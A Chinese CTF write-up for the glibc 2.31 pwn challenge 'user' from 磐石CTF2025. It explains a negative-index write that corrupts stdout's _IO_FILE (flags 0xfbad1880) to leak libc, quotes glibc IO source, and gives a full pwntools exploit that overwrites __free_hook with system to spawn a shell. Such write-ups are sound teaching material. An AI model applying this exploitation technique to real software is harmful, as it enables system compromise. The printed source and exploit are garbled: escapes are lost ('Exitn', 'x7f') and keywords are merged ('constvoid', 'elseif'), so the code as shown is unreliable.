# 磐石CTF2025 Pwn赛题user解析：解密0xfbad1880背后的IO_FILE结构体利用技术

> 原文: https://www.ctfiot.com/265310.html
> ID: 265310

user

前言

关注公众号【Real返璞归真】，回复【磐石CTF2025】获取附件下载地址。

题目名：user

解题数：92

题目描述：无

知识点：IO_FILE结构体伪造、通过stdout泄露libc地址、glibc 2.31环境下的任意地址写利用

本题是一道典型的堆利用题目，但缺少直接的输出功能。

解题关键在于利用程序漏洞修改IO_FILE结构体，从而构造libc地址泄露的条件。

本文章详细解析输出函数的内部调用机制，解释IO_FILE结构体中的_flags字段为何常被伪造为0xfbad1800（或0xfbad1880）的特殊值。

逆向分析

题目给出2.31版本的glibc，将程序拖入IDA分析：
image-20250807144502349

发现是经典的菜单题，各个函数逐个分析，先来看一下add()函数：
image-20250807144857832

bss段全局变量heap数组用于存储最多5个chunk块的指针。如果有空闲位置申请0x50大小的chunk并读入0x40数据。

然后分析delete()函数：
image-20250807144725413

允许我们输入idx，若heap[idx] != NULL则调用free()函数释放。这里只判断idx > 4的情况，没考虑idx可能为负数。

然后分析edit()函数：
image-20250807144918192

允许我们修改heap[idx]的内容，最多输入0x40大小的数据。与delete()函数类似，没有判断idx是否为负数。

然后分析show()函数：
image-20250807145007280

发现程序没有提供输出功能，只调用puts()函数告诉我们输出功能不可用。

漏洞分析

程序漏洞

题目逻辑非常简单，经典的glibc2.31版本下的菜单题目，没有提供show()函数但delete()和edit()的idx可以为负数。

我们看一下bss段中的heap数组所在位置：
image-20250807145153042

可以发现，这个bss段非常干净，除了标准IO和程序内置用到的completed_8061变量外，没有其它可以利用的地方。

而题目没有提供输出功能，我们无法泄露信息，所以可以考虑通过输入负数idx修改标准IO泄露程序信息。

我们使用gdb调试程序，查看标准IO和heap在内存中的布局：
image-20250807145702156

stdout距离heap为0x40大小字节，如果我们使用edit()函数修改heap[-8]就可以修改_IO_2_1_stdout_中的内容。

我们可以修改最多0x40字节大小的数据，如图所示：
image-20250807145853308

IO_FILE

如何通过stdout泄露程序信息呢？这其实是一种常见的套路。

在 glibc 中，stdout（标准输出）是一个 _IO_FILE 结构体对象。其内部有很多字段来维护输出缓冲区的状态，包括：

_IO_write_base: 当前写缓冲区的起始地址

_IO_write_ptr: 当前写指针（指向已经写入的末尾）

_IO_write_end: 写缓冲区的结尾

文件流处于追加模式，即 fp->_flags & _IO_IS_APPENDING 成立，会直接调用 _IO_SYSWRITE() 函数。

文件流不处于追加模式，读写指针不同步（读缓冲区未清空），即 fp->_IO_read_end != fp->_IO_write_base 。先调用_IO_SYSSEEK()调整偏移，跟进返回值决定是否调用_IO_SYSWRITE()。

文件流不处于追加模式，读写指针同步，即 fp->_IO_read_end == fp->_IO_write_base ，直接调用 _IO_SYSWRITE()。

当 _IO_write_end > _IO_write_ptr 时，说明缓冲区还没有被写满，此时程序会先将输出的内容写到缓冲区，缓冲区满后再进行输出。为了不必要的麻烦，我们一般会让这两个指针相等，这样程序会直接调用_IO_new_file_overflow()函数继续处理。

在_IO_new_file_overflow()函数中，f->_flags & _IO_NO_WRITES 不能成立，否则会返回错误。

在_IO_new_file_overflow()函数中，(f->_flags & _IO_CURRENTLY_PUTTING) == 0 不能成立，否则程序会认为当前没有正在写缓冲区，会重新初始化缓冲区导致内容消失。

在new_do_write()函数中，我们直接让 fp->_IO_read_end == fp->_IO_write_base 即可满足条件并成功调用_IO_SYSWRITE()函数。


```
size_t _IO_new_file_xsputn( FILE *f, constvoid *data, size_t n )
{
constchar *s  = (constchar *) data;
size_t  to_do = n;
int  must_flush = 0;
size_t  count = 0;

if ( n <= 0 ) return(0);

/* This is an optimized implementation.
  * If the amount to be written straddles a block boundary
  * (or the filebuf is unbuffered), use sys_write directly. */

/* First figure out how much space is available in the buffer. */
if ( (f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING) )
 {
  count = f->_IO_buf_end - f->_IO_write_ptr;
if ( count >= n )
  {
   constchar *p;
   for ( p = s + n; p > s; )
   {
    if ( *--p == 'n' )
    {
     count  = p - s + 1;
     must_flush = 1;
     break;
    }
   }
  }
 } elseif ( f->_IO_write_end > f->_IO_write_ptr )
  count = f->_IO_write_end - f->_IO_write_ptr;

/* Space available. */
/* Then fill the buffer. */
if ( count > 0 )
 {
if ( count > to_do )
   count = to_do;
  f->_IO_write_ptr = __mempcpy( f->_IO_write_ptr, s, count );
  s   += count;
  to_do  -= count;
 }
    
if ( to_do + must_flush > 0 )
 {
size_t block_size, do_write;
/* Next flush the (full) buffer. */
if ( _IO_OVERFLOW( f, EOF ) == EOF )
   /* If nothing else has to be written we must not signal the
    *   caller that everything has been written.  */
   return(to_do == 0 ? EOF : n - to_do);
/* Try to maintain alignment: write a whole number of blocks.  */
  block_size = f->_IO_buf_end - f->_IO_buf_base;
  do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);
if ( do_write )
  {
   count = new_do_write( f, s, do_write );
   to_do -= count;
   if ( count < do_write )
    return(n - to_do);
  }

/* Now write out the remainder.  Normally, this will fit in the
   * buffer, but it's somewhat messier for line-buffered files,
   * so we let _IO_default_xsputn handle the general case. */
if ( to_do )
   to_do -= _IO_default_xsputn( f, s + do_write, to_do );
 }
    
return(n - to_do);
}
int _IO_new_file_overflow( FILE *f, int ch )
{
if ( f->_flags & _IO_NO_WRITES ) /* SET ERROR */
 {
  f->_flags |= _IO_ERR_SEEN;
  __set_errno( EBADF );
return(EOF);
 }
    
/* If currently reading or no buffer allocated. */
if ( (f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL )
 {
/* Allocate a buffer if needed. */
if ( f->_IO_write_base == NULL )
  {
   _IO_doallocbuf( f );
   _IO_setg( f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base );
  }

/* Otherwise must be currently reading.
   * If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
   * logically slide the buffer forwards one block (by setting the
   * read pointers to all point at the beginning of the block).  This
   * makes room for subsequent output.
   * Otherwise, set the read pointers to _IO_read_end (leaving that
   * alone, so it can continue to correspond to the external position). */
if ( __glibc_unlikely( _IO_in_backup( f ) ) )
  {
   size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
   _IO_free_backup_area( f );
   f->_IO_read_base -= MIN( nbackup,
       f->_IO_read_base - f->_IO_buf_base );
   f->_IO_read_ptr = f->_IO_read_base;
  }

if ( f->_IO_read_ptr == f->_IO_buf_end )
   f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
  f->_IO_write_ptr = f->_IO_read_ptr;
  f->_IO_write_base = f->_IO_write_ptr;
  f->_IO_write_end = f->_IO_buf_end;
  f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

  f->_flags |= _IO_CURRENTLY_PUTTING;
if ( f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED) )
   f->_IO_write_end = f->_IO_write_ptr;
 }
    
if ( ch == EOF )
return(_IO_do_write( f, f->_IO_write_base,
         f->_IO_write_ptr - f->_IO_write_base ) );
    
if ( f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
if ( _IO_do_flush( f ) == EOF )
   return(EOF);
    
 *f->_IO_write_ptr++ = ch;
if ( (f->_flags & _IO_UNBUFFERED)
      || ( (f->_flags & _IO_LINE_BUF) && ch == 'n') )
if ( _IO_do_write( f, f->_IO_write_base,
       f->_IO_write_ptr - f->_IO_write_base ) == EOF )
   return(EOF);
    
return( (unsignedchar) ch);
}
int _IO_new_do_write (FILE *fp, const char *data, size_t to_do)
{
  return (to_do == 0
   || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
static size_t new_do_write( FILE *fp, const char *data, size_t to_do )
{
size_t count;
if ( fp->_flags & _IO_IS_APPENDING )
/* On a system without a proper O_APPEND implementation,
   * you would need to sys_seek(0, SEEK_END) here, but is
   * not needed nor desirable for Unix- or Posix-like systems.
   * Instead, just indicate that offset (before and after) is
   * unpredictable. */
  fp->_offset = _IO_pos_BAD;
elseif ( fp->_IO_read_end != fp->_IO_write_base )
 {
off64_t new_pos
   = _IO_SYSSEEK( fp, fp->_IO_write_base - fp->_IO_read_end, 1 );
if ( new_pos == _IO_pos_BAD )
   return(0);
  fp->_offset = new_pos;
 }
 count = _IO_SYSWRITE( fp, data, to_do );
if ( fp->_cur_column && count )
  fp->_cur_column = _IO_adjust_column( fp->_cur_column - 1, data, count ) + 1;
 _IO_setg( fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base );
 fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
 fp->_IO_write_end = (fp->_mode <= 0
       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED) )
       ? fp->_IO_buf_base : fp->_IO_buf_end);
return(count);
}
# stdout leak libc
p.sendlineafter(b'5. Exitn', b'4')
p.sendlineafter(b'index:n', b'-8')

# _flags = 0xfbad1880
# _IO_read_ptr = _IO_read_base = _IO_read_end = 0
p.sendafter(b'Enter a new username:n', p32(0xfbad1880) + p32(0) + p64(0) * 3 + p8(0x8))

libc_base = u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00')) - 0x1ec980
libc.address = libc_base
success("libc_base = " + hex(libc_base))
# 创建一个chunk存储/bin/sh
p.sendlineafter(b'5. Exit', b'1')
p.sendafter(b'Enter your username:', b'/bin/sh')

# __dso_handle -> __free_hook
p.sendlineafter(b'5. Exit', b'4')
p.sendlineafter(b'index:', b'-11')
p.sendafter(b'Enter a new username:', p64(libc.sym['__free_hook']))

# __free_hook -> system
p.sendlineafter(b'5. Exit', b'4')
p.sendlineafter(b'index:', b'-11')
p.sendafter(b'Enter a new username:', p64(libc.sym['system']))

# system("/bin/sh")
p.sendlineafter(b'5. Exit', b'2')
p.sendlineafter(b'index:', b'0')
from pwn import *

elf = ELF("./user")
libc = ELF("./libc.so.6")
p = process([elf.path])
# p = remote('pss.idss-cn.com', 24447)

context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'

# stdout leak libc
p.sendlineafter(b'5. Exitn', b'4')
p.sendlineafter(b'index:n', b'-8')
p.sendafter(b'Enter a new username:n', p32(0xfbad1880) + p32(0) + p64(0) * 3 + p8(0x8))

libc_base = u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00')) - 0x1ec980
libc.address = libc_base
success("libc_base = " + hex(libc_base))

# gdb.attach(p, 'b *$rebase(0x162B)nc')
# pause()

# __dso_handle -> __free_hook -> system
p.sendlineafter(b'5. Exit', b'1')
p.sendafter(b'Enter your username:', b'/bin/sh')

p.sendlineafter(b'5. Exit', b'4')
p.sendlineafter(b'index:', b'-11')
p.sendafter(b'Enter a new username:', p64(libc.sym['__free_hook']))

p.sendlineafter(b'5. Exit', b'4')
p.sendlineafter(b'index:', b'-11')
p.sendafter(b'Enter a new username:', p64(libc.sym['system']))

p.sendlineafter(b'5. Exit', b'2')
p.sendlineafter(b'index:', b'0')

p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1755440350-wxsync-2025-08-0a55e362cbc4b75450bf3fb1c036efe4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1755440351-wxsync-2025-08-90ab85ed3cb35d5b1689e5e0c4e1c0d7.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1755440353-wxsync-2025-08-5b9f2d20db19ad73bed6c644f185b22d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1755440354-wxsync-2025-08-5e24bd24b9eb0fe61b0c6997f1568b82.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1755440356-wxsync-2025-08-085ca10668f9bfdb4c8e3baece85eb03.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1755440357-wxsync-2025-08-93e0b8bf5364d3b2ea9af36aed32f128.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1755440359-wxsync-2025-08-27c25b3fa7527ef9ccbe68ec30035101.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1755440361-wxsync-2025-08-d04fba48281e8e0e2d2e8fe1cbcb6f46.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1755440363-wxsync-2025-08-f31835dfe68e51032379b67145ec876d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1755440365-wxsync-2025-08-bd64953042571e3b0bc54a90ac1028c7.png)